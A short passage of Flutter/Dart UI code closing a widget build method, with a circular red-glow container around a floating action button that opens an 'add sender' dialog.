          shape: BoxShape.circle,
          boxShadow: [
            BoxShadow(color: accentRed.withOpacity(0.4), blurRadius: 16, spreadRadius: 2)
          ],
        ),
        child: FloatingActionButton(
          onPressed: showAddSenderDialog,
          backgroundColor: Colors.transparent,
          elevation: 0,
          child: const Icon(Icons.add, color: primaryWhite, size: 26),
        ),
      ),
    );
  }
}